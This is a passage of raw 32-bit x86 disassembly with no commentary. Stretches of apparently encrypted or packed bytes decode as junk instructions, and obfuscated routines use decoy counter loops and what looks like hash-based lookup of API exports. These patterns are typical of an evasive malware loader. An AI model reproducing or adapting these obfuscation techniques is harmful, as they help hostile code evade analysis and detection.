  407d4a:	test   al,0x78
  407d4c:	pop    esp
  407d4d:	mov    esp,0xf98b0b65
  407d52:	enter  0xee15,0xf2
  407d56:	add    al,0x6c
  407d58:	std    
  407d59:	pop    esi
  407d5a:	rcr    BYTE PTR [edx-0x4a],cl
  407d5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d5e:	add    BYTE PTR [ebx],ah
  407d60:	pop    edi
  407d61:	nop
  407d62:	xchg   ebx,eax
  407d63:	and    DWORD PTR [eax-0xc129120],ecx
  407d69:	mov    eax,DWORD PTR [ebp-0xc]
  407d6c:	mov    edx,DWORD PTR [ebp-0x18]
  407d6f:	or     eax,edx
  407d71:	cmp    eax,0xffff6dad
  407d76:	je     0x407ec1
  407d7c:	mov    eax,DWORD PTR [ebp-0x10]
  407d7f:	jmp    0x407eb6
  407d84:	push   edi
  407d85:	add    BYTE PTR [esi-0x1b],bh
  407d88:	jge    0x407d6f
  407d8a:	jnp    0x407d26
  407d8c:	and    al,BYTE PTR [ebx+0x1fcd7564]
  407d92:	fisttp WORD PTR [ebx+esi*1+0x67c7cc9]
  407d99:	jg     0x407e17
  407d9b:	jl     0x407dd9
  407d9d:	xchg   edi,eax
  407d9e:	xchg   esi,eax
  407d9f:	and    al,0x86
  407da1:	sti    
  407da2:	push   esi
  407da3:	in     eax,0xf4
  407da5:	mov    edi,0x4cdfaac5
  407daa:	shl    DWORD PTR [ebp-0x2500ad44],cl
  407db0:	ja     0x407dd0
  407db2:	mov    esp,0xa7ea0681
  407db7:	or     BYTE PTR [eax+0x23],cl
  407dba:	out    dx,al
  407dbb:	xchg   al,cl
  407dbd:	push   0x70
  407dbf:	cmp    bl,BYTE PTR [edi-0x2c1edd00]
  407dc5:	cmc    
  407dc6:	int    0xbd
  407dc8:	dec    esi
  407dc9:	cs push ds
  407dcb:	inc    esi
  407dcc:	mov    ds:0xda4c394d,eax
  407dd1:	mov    BYTE PTR [edx+0x7d],ch
  407dd4:	sahf   
  407dd5:	pusha  
  407dd6:	outs   dx,DWORD PTR ds:[esi]
  407dd7:	sub    eax,0xd7ca9923
  407ddc:	add    dh,bh
  407dde:	sbb    eax,0x667df17c
  407de3:	cdq    
  407de4:	jp     0x407dc0
  407de6:	aas    
  407de7:	arpl   WORD PTR [esi-0x65],si
  407dea:	outs   dx,BYTE PTR ds:[esi]
  407deb:	pop    esi
  407dec:	push   es
  407ded:	pop    es
  407dee:	sbb    DWORD PTR [ebx-0x7e],ecx
  407df1:	fisubr DWORD PTR [edx-0x1b]
  407df4:	mov    al,0xf3
  407df6:	dec    ebp
  407df7:	icebp  
  407df8:	daa    
  407df9:	ss call 0x44e:0xcbe71ac8
  407e01:	stos   DWORD PTR es:[edi],eax
  407e02:	and    ch,cl
  407e04:	imul   esp,ebx,0xffffff99
  407e07:	fwait
  407e08:	aad    0x5
  407e0a:	sbb    ah,dl
  407e0c:	cmp    al,0x9e
  407e0e:	lds    eax,FWORD PTR [ecx-0x351af687]
  407e14:	rol    BYTE PTR [esi+0x5e3c917b],1
  407e1a:	aam    0xda
  407e1c:	sub    al,0x70
  407e1e:	cmc    
  407e1f:	or     ebp,DWORD PTR [ebx+0x7a42809f]
  407e25:	ds aas 
  407e27:	loop   0x407e71
  407e29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e2a:	(bad)  
  407e2b:	mov    bl,0xf9
  407e2d:	out    dx,al
  407e2e:	mov    edx,eax
  407e30:	jecxz  0x407e21
  407e32:	ss mov ecx,0x41e9f36c
  407e38:	aad    0xe0
  407e3a:	push   ss
  407e3b:	sub    edi,DWORD PTR [ecx]
  407e3d:	sbb    al,0x87
  407e3f:	outs   dx,DWORD PTR ds:[esi]
  407e40:	neg    BYTE PTR [edx+0x59]
  407e43:	or     al,0x61
  407e45:	repz mov ecx,0xf02370c2
  407e4b:	jp     0x407e66
  407e4d:	loope  0x407e04
  407e4f:	xchg   ebx,eax
  407e50:	sahf   
  407e51:	add    eax,0xb12e2f22
  407e56:	pushf  
  407e57:	mov    esp,0x9aaed20a
  407e5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e5d:	pop    edi
  407e5e:	leave  
  407e5f:	(bad)  
  407e60:	push   ds
  407e61:	in     eax,dx
  407e62:	lds    edx,FWORD PTR [edx+0x338fb87]
  407e68:	mov    bl,0x1
  407e6a:	mov    fs,WORD PTR [edx-0x65]
  407e6d:	and    eax,0x57bc7ea4
  407e72:	cmc    
  407e73:	push   cs
  407e74:	add    esp,ecx
  407e76:	fs test eax,0xfec2b13
  407e7c:	jmp    0xd7b4:0xd972132d
  407e83:	stc    
  407e84:	cmp    DWORD PTR [edi-0x6d],esp
  407e87:	add    eax,0x1fc16d96
  407e8c:	push   ss
  407e8d:	xor    DWORD PTR [esi+0x3ab5d16b],0x16
  407e94:	out    0x86,eax
  407e96:	or     eax,DWORD PTR [eax+0x2cba9b2f]
  407e9c:	(bad)  
  407e9d:	push   edx
  407e9e:	add    BYTE PTR [ebp-0x2df8c49],dh
  407ea4:	xor    al,0x22
  407ea6:	cdq    
  407ea7:	sahf   
  407ea8:	jg     0x407e57
  407eaa:	adc    BYTE PTR fs:[ebx-0x5d22dbca],bh
  407eb1:	pop    edx
  407eb2:	mov    ?,WORD PTR [ebp-0x55]
  407eb5:	or     al,0x81
  407eb7:	xor    BYTE PTR [edi-0x16d9af06],cl
  407ebd:	inc    esp
  407ebe:	std    
  407ebf:	(bad)  
  407ec0:	jmp    DWORD PTR [esi-0x75]
  407ec3:	inc    ebp
  407ec4:	cld    
  407ec5:	mov    edi,DWORD PTR [ebp+0x8]
  407ec8:	mov    edi,DWORD PTR [edi]
  407eca:	mov    edx,0x8a42
  407ecf:	xor    ax,dx
  407ed2:	mov    edx,0x3b08
  407ed7:	add    ax,dx
  407eda:	cmp    ax,WORD PTR [edi]
  407edd:	je     0x408061
  407ee3:	mov    eax,DWORD PTR [ebp-0x14]
  407ee6:	xor    eax,ecx
  407ee8:	jmp    0x40801f
  407eed:	(bad)  
  407eee:	pop    edx
  407eef:	fst    st(3)
  407ef1:	jge    0x407f46
  407ef3:	out    0x5d,al
  407ef5:	jnp    0x407ee7
  407ef7:	inc    esi
  407ef8:	sub    DWORD PTR [edi+0x0],edx
  407efb:	retf   
  407efc:	int    0xdd
  407efe:	enter  0x7c7c,0x6
  407f02:	jg     0x407f80
  407f04:	jl     0x407e88
  407f06:	aas    
  407f07:	cmp    BYTE PTR [edx-0x1c],ch
  407f0a:	fs jge 0x407eff
  407f0d:	les    eax,FWORD PTR [eax-0x1b]
  407f10:	cs ret 0x93c3
  407f14:	out    dx,eax
  407f15:	fwait
  407f16:	and    esp,DWORD PTR [ebx-0x6e]
  407f19:	icebp  
  407f1a:	scas   eax,DWORD PTR es:[edi]
  407f1b:	xchg   edi,eax
  407f1c:	sahf   
  407f1d:	xlat   BYTE PTR ds:[ebx]
  407f1e:	dec    ebx
  407f1f:	rcr    BYTE PTR [ebx-0x206d9884],cl
  407f25:	mov    ch,0xec
  407f27:	test   al,cl
  407f29:	mov    eax,ds:0x5fd7bb8c
  407f2e:	push   0x3fcd985b
  407f33:	jle    0x407f0b
  407f35:	xor    al,0x2b
  407f37:	xlat   BYTE PTR ds:[ebx]
  407f38:	add    eax,0xcd932eeb
  407f3d:	bound  ecx,QWORD PTR [ebx-0x5e]
  407f40:	lods   al,BYTE PTR ds:[esi]
  407f41:	popf   
  407f42:	add    DWORD PTR [edx-0x12],ecx
  407f45:	add    DWORD PTR [esi+0x12f46b3b],ecx
  407f4b:	fdivr  DWORD PTR [eax+ecx*8+0x50]
  407f4f:	sub    al,0xce
  407f51:	ds xor cl,bl
  407f54:	pop    eax
  407f55:	out    dx,eax
  407f56:	or     ebp,ecx
  407f58:	inc    edx
  407f59:	inc    ebp
  407f5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f5b:	push   esp
  407f5c:	jne    0x407f02
  407f5e:	retf   0x2e2d
  407f61:	fs jge 0x407f6c
  407f64:	push   edx
  407f65:	stos   DWORD PTR es:[edi],eax
  407f66:	inc    esp
  407f67:	xchg   edi,eax
  407f68:	jmp    FWORD PTR [eax]
  407f6a:	xor    eax,0xdbc94d14
  407f6f:	dec    edi
  407f70:	xor    eax,0xc8106357
  407f75:	sbb    eax,0xce0482ed
  407f7a:	sbb    DWORD PTR [esi],0xd8836a36
  407f80:	inc    ecx
  407f81:	sub    BYTE PTR [eax],bl
  407f83:	dec    ecx
  407f85:	add    bl,BYTE PTR [edi+0x128d8516]
  407f8b:	xor    ch,BYTE PTR [esi+0x12c2b6fe]
  407f91:	and    BYTE PTR [edx],ch
  407f93:	add    BYTE PTR [ecx+0x6],ch
  407f96:	jp     0x407f4e
  407f98:	scas   al,BYTE PTR es:[edi]
  407f99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f9a:	xchg   DWORD PTR [ebx],esi
  407f9c:	scas   eax,DWORD PTR es:[edi]
  407f9d:	mov    ecx,0x495c670e
  407fa2:	ss jle 0x407f9c
  407fa5:	adc    ah,BYTE PTR ds:0xe5a97a93
  407fab:	mov    bh,0x66
  407fad:	inc    esp
  407fae:	daa    
  407faf:	jne    0x407fbd
  407fb1:	push   eax
  407fb2:	sub    ebp,DWORD PTR [ebp-0x18]
  407fb5:	sbb    BYTE PTR [eax-0x2e],cl
  407fb8:	mov    eax,ds:0x8566f0cb
  407fbd:	call   0xb127:0x4e472050
  407fc4:	(bad)  
  407fc5:	call   0xebc6:0x27cddc41
  407fcc:	xor    al,0x22
  407fce:	xor    bh,BYTE PTR [ebx-0x29]
  407fd1:	inc    esp
  407fd2:	neg    edx
  407fd4:	jb     0x408018
  407fd6:	add    bl,0xd2
  407fd9:	imul   ecx,DWORD PTR [eax+ebp*8-0x59],0xe1c89ac2
  407fe1:	push   edi
  407fe2:	mov    al,0x42
  407fe4:	xor    BYTE PTR [esi+eax*2],cl
  407fe7:	jl     0x408026
  407fe9:	and    DWORD PTR [ebx+eiz*1+0x13acfd6f],0x7770ac36
  407ff4:	xchg   edx,eax
  407ff5:	add    ebp,DWORD PTR ds:[bp+di]
  407ff9:	pushf  
  407ffa:	scas   eax,DWORD PTR es:[edi]
  407ffb:	(bad)  
  407ffc:	fpatan 
  407ffe:	in     eax,0xdf
  408000:	jecxz  0x408036
  408002:	inc    esp
  408003:	pop    edx
  408004:	lods   eax,DWORD PTR ds:[esi]
  408005:	xlat   BYTE PTR ds:[ebx]
  408006:	pusha  
  408007:	(bad)  
  408008:	jb     0x408019
  40800a:	xchg   edi,eax
  40800b:	lods   al,BYTE PTR ss:[esi]
  40800d:	ins    DWORD PTR es:[edi],dx
  40800e:	cmp    BYTE PTR [ecx+0x4ee0ff6b],dh
  408014:	daa    
  408015:	nop
  408016:	je     0x408001
  408018:	mov    ebp,0x5863f37
  40801d:	mov    ah,0xf
  40801f:	add    eax,esi
  408021:	mov    DWORD PTR [ebp-0x24],eax
  408024:	mov    eax,DWORD PTR [ebp-0x28]
  408027:	mov    di,WORD PTR [ebp-0x2c]
  40802b:	mov    ebx,0x8a42
  408030:	xor    di,bx
  408033:	add    di,dx
  408036:	movzx  edx,di
  408039:	mov    edi,DWORD PTR [ebp-0x8]
  40803c:	xor    edi,ecx
  40803e:	lea    edx,[edx+edi*1+0x32729e]
  408045:	add    DWORD PTR [eax],edx
  408047:	mov    eax,DWORD PTR [ebp-0x20]
  40804a:	mov    edx,DWORD PTR [ebp-0x8]
  40804d:	mov    edi,DWORD PTR [ebp-0x24]
  408050:	xor    edx,ecx
  408052:	add    edx,esi
  408054:	imul   edx,edi
  408057:	sub    DWORD PTR [eax],edx
  408059:	mov    eax,DWORD PTR [ebp-0x14]
  40805c:	jmp    0x407c08
  408061:	mov    eax,DWORD PTR [ebp-0xc]
  408064:	mov    edx,DWORD PTR [ebp-0x18]
  408067:	xor    eax,edx
  408069:	cmp    eax,0xe77c698d
  40806e:	je     0x407c05
  408074:	mov    eax,DWORD PTR [ebp-0x10]
  408077:	add    DWORD PTR [eax],0x7403501
  40807d:	jmp    0x407c05
  408082:	mov    eax,DWORD PTR [ebp-0x1c]
  408085:	cmp    DWORD PTR [eax],edi
  408087:	je     0x407c05
  40808d:	mov    eax,0x800f1c9c
  408092:	jmp    0x407c0c
  408097:	push   ebp
  408098:	mov    ebp,esp
  40809a:	push   ecx
  40809b:	xor    eax,eax
  40809d:	push   ecx
  40809e:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  4080a5:	sub    edx,0x2ef1
  4080ab:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  4080b2:	xor    ecx,ecx
  4080b4:	or     ecx,DWORD PTR ds:0x44e420
  4080ba:	sbb    ecx,DWORD PTR ds:0x410753
  4080c0:	mov    DWORD PTR ds:0x44e420,ecx
  4080c6:	mov    eax,DWORD PTR [ebp-0x4]
  4080c9:	dec    DWORD PTR ds:0x410753
  4080cf:	push   esi
  4080d0:	add    DWORD PTR ds:0x44b6cc,0x9cd
  4080da:	mov    esi,DWORD PTR [ebp-0x8]
  4080dd:	xor    ecx,0x7d4d
  4080e3:	mov    edx,0x7510857
  4080e8:	xor    eax,edx
  4080ea:	adc    DWORD PTR ds:0x42484c,0x7d5d
  4080f4:	xor    esi,edx
  4080f6:	and    DWORD PTR ds:0x44e410,0x0
  408100:	mov    ecx,DWORD PTR ds:0x44e410
  408106:	inc    ecx
  408107:	mov    DWORD PTR ds:0x44e410,ecx
  40810d:	cmp    DWORD PTR ds:0x44e410,0x1b
  408114:	jne    0x408125
  40811a:	push   0x410845
  40811f:	call   DWORD PTR ds:0x443378
  408125:	cmp    DWORD PTR ds:0x44e410,0x13
  40812c:	jb     0x408100
  408132:	mov    ecx,0x32729e
  408137:	add    esi,ecx
  408139:	jmp    0x4081e2
  40813e:	xchg   esp,eax
  40813f:	and    al,ch
  408141:	and    al,0x5d
  408143:	out    0x6d,eax
  408145:	mov    ds:0x3d17a190,al
  40814a:	repz or BYTE PTR ds:0x7ccbe73e,0x7c
  408152:	mov    BYTE PTR [esp+edi*2+0x7c],bh
  408156:	pusha  
  408157:	repnz push cs
  408159:	ja     0x408106
  40815b:	je     0x4080eb
  40815d:	pusha  
  40815e:	cld    
  40815f:	nop
  408160:	in     eax,0x5a
  408162:	inc    esi
  408163:	mov    ?,WORD PTR [eax+0x10]
  408166:	ds std 
  408168:	xor    eax,0x4b69f4eb
  40816d:	ret    
  40816e:	leave  
  40816f:	pop    esi
  408170:	xchg   ebx,eax
  408171:	add    ch,BYTE PTR [ebx+0x10]
  408174:	shl    BYTE PTR [esi-0xc2e6c95],cl
  40817a:	es jb  0x408111
  40817d:	push   0x352a8484
  408182:	push   ecx
  408183:	pop    ebp
  408184:	hlt    
  408185:	mov    esp,DWORD PTR [esi]
  408187:	sbb    dh,BYTE PTR [ebx-0x1443f5e5]
  40818d:	in     eax,dx
  40818e:	imul   ecx,DWORD PTR [ebp+0x17],0x832cbf09
  408195:	mov    eax,0x97246fdf
  40819a:	xchg   ecx,eax
  40819b:	cmp    al,0x7a
  40819d:	shl    BYTE PTR [eax-0x7cc67145],0x5a
  4081a4:	mov    ebp,0xbf401dbe
  4081a9:	test   DWORD PTR [ebp-0x2d],edi
  4081ac:	or     eax,DWORD PTR [ebp+0x30e5f39b]
  4081b2:	gs mov dl,0x23
  4081b5:	push   es
  4081b6:	cmp    DWORD PTR ds:0x6a7e9beb,ecx
  4081bc:	jp     0x40818b
  4081be:	call   0xbdeae0bb
  4081c3:	ds jmp 0x1433:0x30a95760
  4081cb:	adc    al,0x48
  4081cd:	stos   DWORD PTR es:[edi],eax
  4081ce:	out    0x34,al
  4081d0:	pop    esp
  4081d1:	mov    bl,0xc9
  4081d3:	inc    dx
  4081d5:	call   0x57e103bc
  4081da:	in     eax,0x4e
  4081dc:	dec    ebp
  4081dd:	in     al,0x43
  4081df:	xchg   ebx,eax
  4081e0:	and    bh,BYTE PTR [eax]
  4081e2:	add    eax,ecx
  4081e4:	imul   eax,esi
  4081e7:	mov    esi,DWORD PTR [ebp+0xc]
  4081ea:	mov    DWORD PTR ds:0x44b6d0,0x538a
  4081f4:	cmp    esi,eax
  4081f6:	jne    0x40826b
  4081fc:	mov    DWORD PTR ds:0x44b6d4,0x1c
  408206:	cmp    DWORD PTR ds:0x44b6d4,0x0
  40820d:	je     0x408255
  408213:	cmp    DWORD PTR ds:0x44b6d4,0xe
  40821a:	jne    0x408229
  408220:	push   DWORD PTR [ebp-0x14]
  408223:	call   DWORD PTR ds:0x44301c
  408229:	cmp    DWORD PTR ds:0x44b6d4,0xf
  408230:	jne    0x408243
  408236:	mov    esi,DWORD PTR ds:0x44b6d4
  40823c:	dec    esi
  40823d:	mov    DWORD PTR ds:0x44b6d4,esi
  408243:	mov    esi,DWORD PTR ds:0x44b6d4
  408249:	dec    esi
  40824a:	mov    DWORD PTR ds:0x44b6d4,esi
  408250:	jmp    0x408206
  408255:	mov    eax,DWORD PTR [ebp-0x4]
  408258:	mov    esi,DWORD PTR [ebp-0x8]
  40825b:	xor    eax,edx
  40825d:	xor    esi,edx
  40825f:	add    eax,ecx
  408261:	add    esi,ecx
  408263:	imul   eax,esi
  408266:	jmp    0x40834f
  40826b:	mov    eax,DWORD PTR [ebp+0xc]
  40826e:	mov    eax,DWORD PTR [eax+0x78]
  408271:	mov    DWORD PTR [ebp+0xc],eax
  408274:	mov    eax,DWORD PTR [ebp-0x4]
  408277:	mov    esi,DWORD PTR [ebp-0x8]
  40827a:	xor    eax,edx
  40827c:	xor    esi,edx
  40827e:	jmp    0x408327
  408283:	mov    edi,0x6a6fd0cd
  408288:	jns    0x4082cd
  40828a:	std    
  40828b:	ficomp WORD PTR [ebx+0x10]
  40828e:	jo     0x408265
  408290:	push   cs
  408291:	fsubrp st(5),st
  408293:	jae    0x40825f
  408295:	jl     0x408313
  408297:	mov    BYTE PTR [esp+edi*2+0x7c],bh
  40829b:	int3   
  40829c:	inc    esp
  40829d:	xchg   ecx,eax
  40829e:	sahf   
  40829f:	and    eax,DWORD PTR [ebp+0x83cda99]
  4082a5:	mov    ah,0x89
  4082a7:	push   cs
  4082a8:	jne    0x40829b
  4082aa:	das    
  4082ab:	mov    cl,cl
  4082ad:	xchg   ebp,eax
  4082ae:	xchg   edx,eax
  4082af:	jmp    0x7501c4eb
  4082b4:	fcom   QWORD PTR [edi+edi*1]
  4082b7:	fsub   DWORD PTR [ebp-0x58]
  4082ba:	xchg   DWORD PTR [esi+0x3a],edx
  4082bd:	pushf  
  4082be:	lock inc ebp
  4082c0:	add    eax,0x4381e679
  4082c5:	mov    dh,0x3c
  4082c7:	cmp    eax,0x7ac9a75a
  4082cc:	outs   dx,BYTE PTR ds:[esi]
  4082cd:	add    BYTE PTR [ebp+0x2d],al
  4082d0:	xchg   ecx,eax
  4082d1:	je     0x4082d8
  4082d3:	pushf  
  4082d4:	and    DWORD PTR [eax+0x7f1fb3fe],0xffffff86
  4082db:	dec    esp
  4082dc:	sbb    DWORD PTR ds:0xa18676f7,0xf6b122a4
  4082e6:	mov    DWORD PTR [ecx],edx
  4082e8:	lods   eax,DWORD PTR ds:[esi]
  4082e9:	loope  0x40833b
  4082eb:	je     0x40833f
  4082ed:	fsub   DWORD PTR [ecx+0xa9990f]
  4082f3:	ss dec ecx
  4082f5:	mov    ds:0xd492c7a5,al
  4082fa:	sbb    dl,0x92
  4082fd:	push   0x67
  4082ff:	xchg   esi,eax
  408300:	std    
  408301:	push   edx
  408302:	and    al,0xe3
  408304:	xchg   ebp,eax
  408305:	cld    
  408306:	es push ds
  408308:	mov    eax,ds:0x1ebec1f2
  40830d:	pop    edi
  40830e:	daa    
  40830f:	adc    BYTE PTR [ebx+0x7e],dl
  408312:	cwde   
  408313:	out    0x3e,ax
  408316:	inc    ebp
  408317:	mov    bl,0x3e
  408319:	das    
  40831a:	aad    0xda
  40831c:	mov    dh,0x26
  40831e:	xor    edx,DWORD PTR [eax]
  408320:	or     DWORD PTR [ebx-0x37],0x2057ad88
  408327:	add    eax,ecx
  408329:	add    esi,ecx
  40832b:	imul   eax,esi
  40832e:	mov    esi,DWORD PTR [ebp+0xc]
  408331:	cmp    esi,eax
  408333:	mov    eax,DWORD PTR [ebp-0x4]
  408336:	je     0x408258
  40833c:	xor    eax,edx
  40833e:	add    eax,ecx
  408340:	mov    ecx,DWORD PTR [ebp+0xc]
  408343:	imul   eax,ecx
  408346:	add    eax,DWORD PTR [ebp+0x8]
  408349:	mov    DWORD PTR [ebp+0xc],eax
  40834c:	mov    eax,DWORD PTR [ebp+0xc]
  40834f:	pop    esi
  408350:	leave  
  408351:	ret    0x8
  408354:	push   ebp
  408355:	mov    ebp,esp
  408357:	sub    esp,0xa0
  40835d:	push   0x4452b8
  408362:	xor    DWORD PTR ds:0x44e418,0x56f9
  40836c:	call   DWORD PTR ds:0x4430a0
  408372:	adc    DWORD PTR ds:0x448980,0x424858
  40837c:	test   eax,eax
  40837e:	mov    DWORD PTR ds:0x448984,0xdf5
  408388:	je     0x40839f
  40838e:	or     DWORD PTR ds:0x44b6e4,0x448990
  408398:	xor    eax,eax
  40839a:	jmp    0x409294
  40839f:	sub    DWORD PTR ds:0x44b6dc,0x44899c
  4083a9:	push   esi
  4083aa:	and    DWORD PTR ds:0x424858,0x0
  4083b4:	jmp    0x4083c6
  4083b9:	mov    esi,DWORD PTR ds:0x424858
  4083bf:	inc    esi
  4083c0:	mov    DWORD PTR ds:0x424858,esi
  4083c6:	cmp    DWORD PTR ds:0x424858,0x1f
  4083cd:	jae    0x408414
  4083d3:	cmp    DWORD PTR ds:0x424858,0x9
  4083da:	jne    0x4083eb
  4083e0:	push   0x3309
  4083e5:	call   DWORD PTR ds:0x44337c
  4083eb:	cmp    DWORD PTR ds:0x424858,0x8
  4083f2:	jne    0x408405
  4083f8:	mov    esi,DWORD PTR ds:0x424858
  4083fe:	inc    esi
  4083ff:	mov    DWORD PTR ds:0x424858,esi
  408405:	jmp    0x4083b9
  40840a:	or     DWORD PTR ds:0x44b6e0,0x7a7b
  408414:	mov    esi,0x876987
  408419:	mov    DWORD PTR ds:0x448990,0x1efc
  408423:	push   esi
  408424:	push   0x4452fc
  408429:	push   0x445324
  40842e:	call   DWORD PTR ds:0x443370
  408434:	mov    DWORD PTR ds:0x44e424,0x50e
  40843e:	cmp    eax,esi
  408440:	je     0x4084a1
  408446:	or     DWORD PTR ds:0x448980,0x78e6
  408450:	push   0x98786856
  408455:	add    DWORD PTR ds:0x424850,0x6d32
  40845f:	push   0x344
  408464:	adc    DWORD PTR ds:0x41074f,0x5b99
  40846e:	push   0x545
  408473:	adc    DWORD PTR ds:0x44899c,0x2d37
  40847d:	push   0x675765
  408482:	sbb    DWORD PTR ds:0x410743,0x424858
  40848c:	push   0x67576
  408491:	push   0x86789768
  408496:	call   DWORD PTR ds:0x443368
  40849c:	jmp    0x409293
  4084a1:	or     edx,0x6156
  4084a7:	mov    ecx,0xf89c8535
  4084ac:	and    esi,0x7fd
  4084b2:	mov    DWORD PTR [ebp-0x20],ecx
  4084b5:	sub    esi,0x48f6
  4084bb:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  4084c2:	lea    eax,[ebp-0x4c]
  4084c5:	adc    DWORD PTR ds:0x44e424,ebx
  4084cb:	mov    DWORD PTR [ebp-0x30],eax
  4084ce:	add    esi,DWORD PTR ds:0x4489a0
  4084d4:	lea    eax,[ebp-0x54]
  4084d7:	mov    DWORD PTR [ebp-0x14],eax
  4084da:	mov    DWORD PTR ds:0x4489a4,0x12
  4084e4:	cmp    DWORD PTR ds:0x4489a4,0x0
  4084eb:	je     0x40853a
  4084f1:	cmp    DWORD PTR ds:0x4489a4,0x6
  4084f8:	jne    0x408509
  4084fe:	push   0x8a27
  408503:	call   DWORD PTR ds:0x443380
  408509:	cmp    DWORD PTR ds:0x4489a4,0x7
  408510:	jne    0x408521
  408516:	mov    eax,ds:0x4489a4
  40851b:	dec    eax
  40851c:	mov    ds:0x4489a4,eax
  408521:	xor    eax,eax
  408523:	xor    eax,DWORD PTR ds:0x4489a4
  408529:	dec    eax
  40852a:	mov    ds:0x4489a4,eax
  40852f:	jmp    0x4084e4
  408534:	sbb    esi,DWORD PTR ds:0x44e418
  40853a:	mov    eax,ds:0x4451a0
  40853f:	and    DWORD PTR ds:0x44e414,0x0
  408549:	jmp    0x40855b
  40854e:	mov    esi,DWORD PTR ds:0x44e414
  408554:	inc    esi
  408555:	mov    DWORD PTR ds:0x44e414,esi
  40855b:	cmp    DWORD PTR ds:0x44e414,0x16
  408562:	jae    0x4085a2
  408568:	cmp    DWORD PTR ds:0x44e414,0x1d
  40856f:	jne    0x40858a
  408575:	push   0x61c5
  40857a:	push   0x7b2c
  40857f:	push   0x2e55
  408584:	call   DWORD PTR ds:0x443384
  40858a:	jmp    0x40854e
  40858f:	movzx  edx,WORD PTR ds:0x44b6e0
  408596:	sbb    edx,DWORD PTR ds:0x424854
  40859c:	mov    DWORD PTR ds:0x44b6e0,edx
  4085a2:	mov    eax,DWORD PTR [eax+0x1c8]
  4085a8:	xor    edx,edx
  4085aa:	mov    eax,DWORD PTR [eax]
  4085ac:	mov    DWORD PTR ds:0x44e428,0x299a
  4085b6:	mov    edx,DWORD PTR [ebp-0x14]
  4085b9:	and    DWORD PTR ds:0x44e414,0x0
  4085c3:	xor    esi,esi
  4085c5:	add    esi,DWORD PTR ds:0x44e414
  4085cb:	inc    esi
  4085cc:	mov    DWORD PTR ds:0x44e414,esi
  4085d2:	cmp    DWORD PTR ds:0x44e414,0x27
  4085d9:	jne    0x4085f1
  4085df:	push   0x7f38
  4085e4:	push   0x1
  4085e6:	push   0x41098d
  4085eb:	call   DWORD PTR ds:0x443388
  4085f1:	cmp    DWORD PTR ds:0x44e414,0x1d
  4085f8:	jb     0x4085c3
  4085fe:	and    DWORD PTR ds:0x44b6d4,0x0
  408608:	xor    esi,esi
  40860a:	add    esi,DWORD PTR ds:0x44b6d4
  408610:	inc    esi
  408611:	mov    DWORD PTR ds:0x44b6d4,esi
  408617:	cmp    DWORD PTR ds:0x44b6d4,0xa
  40861e:	jne    0x40862f
  408624:	push   0x40b4
  408629:	call   DWORD PTR ds:0x4430ec
  40862f:	cmp    DWORD PTR ds:0x44b6d4,0x9
  408636:	jne    0x408649
  40863c:	mov    esi,DWORD PTR ds:0x44b6d4
  408642:	inc    esi
  408643:	mov    DWORD PTR ds:0x44b6d4,esi
  408649:	cmp    DWORD PTR ds:0x44b6d4,0x1b
  408650:	jb     0x408608
  408656:	or     DWORD PTR ds:0x4489a0,0x1250
  408660:	push   ebx
  408661:	movzx  esi,BYTE PTR ds:0x448990
  408668:	sub    esi,DWORD PTR ds:0x424850
  40866e:	mov    DWORD PTR ds:0x448990,esi
  408674:	mov    esi,0x7510857
  408679:	mov    DWORD PTR ds:0x424850,0x4f36
  408683:	xor    eax,esi
  408685:	sub    DWORD PTR ds:0x44e40c,0x44b6e8
  40868f:	push   edi
  408690:	mov    DWORD PTR ds:0x448990,0x1b
  40869a:	cmp    DWORD PTR ds:0x448990,0x0
  4086a1:	je     0x408750
  4086a7:	cmp    DWORD PTR ds:0x448990,0xd
  4086ae:	jne    0x4086c9
  4086b4:	push   0x7f5c
  4086b9:	push   0x1
  4086bb:	push   DWORD PTR [ebp-0x18]
  4086be:	push   0x52f7
  4086c3:	call   DWORD PTR ds:0x4430f0
  4086c9:	cmp    DWORD PTR ds:0x448990,0xe
  4086d0:	jne    0x4086e3
  4086d6:	mov    edi,DWORD PTR ds:0x448990
  4086dc:	dec    edi
  4086dd:	mov    DWORD PTR ds:0x448990,edi
  4086e3:	mov    edi,DWORD PTR ds:0x448990
  4086e9:	dec    edi
  4086ea:	mov    DWORD PTR ds:0x448990,edi
  4086f0:	jmp    0x40869a
  4086f5:	and    DWORD PTR ds:0x44e428,0x0
  4086ff:	mov    edi,DWORD PTR ds:0x44e428
  408705:	inc    edi
  408706:	mov    DWORD PTR ds:0x44e428,edi
  40870c:	cmp    DWORD PTR ds:0x44e428,0x9
  408713:	jne    0x408729
  408719:	push   0x3065
  40871e:	push   0x34da
  408723:	call   DWORD PTR ds:0x44338c
  408729:	cmp    DWORD PTR ds:0x44e428,0x8
  408730:	jne    0x408743
  408736:	mov    edi,DWORD PTR ds:0x44e428
  40873c:	inc    edi
  40873d:	mov    DWORD PTR ds:0x44e428,edi
  408743:	cmp    DWORD PTR ds:0x44e428,0x12
  40874a:	jb     0x4086ff
  408750:	mov    edi,0x32729e
  408755:	sbb    DWORD PTR ds:0x44e424,0x410753
  40875f:	add    eax,edi
  408761:	mov    DWORD PTR [edx],eax
  408763:	movzx  eax,BYTE PTR ds:0x44b6cc
  40876a:	mov    eax,ds:0x44541c
  40876f:	cmp    eax,0x23d14057
  408774:	mov    DWORD PTR ds:0x424848,0x37ed
  40877e:	mov    eax,DWORD PTR [ebp-0x18]
  408781:	mov    DWORD PTR ds:0x44b6e4,0x441f
  40878b:	je     0x4087a5
  408791:	neg    ecx
  408793:	mov    ecx,DWORD PTR [ebp-0x20]
  408796:	xor    eax,esi
  408798:	add    eax,edi
  40879a:	imul   eax,ecx
  40879d:	mov    DWORD PTR [ebp-0x20],eax
  4087a0:	jmp    0x40903b
  4087a5:	xor    edx,DWORD PTR ds:0x44b6cc
  4087ab:	xor    eax,esi
  4087ad:	add    eax,edi
  4087af:	and    DWORD PTR ds:0x448994,0x0
  4087b9:	mov    edx,DWORD PTR ds:0x448994
  4087bf:	inc    edx
  4087c0:	mov    DWORD PTR ds:0x448994,edx
  4087c6:	cmp    DWORD PTR ds:0x448994,0x1c
  4087cd:	jne    0x4087eb
  4087d3:	push   0x41098d
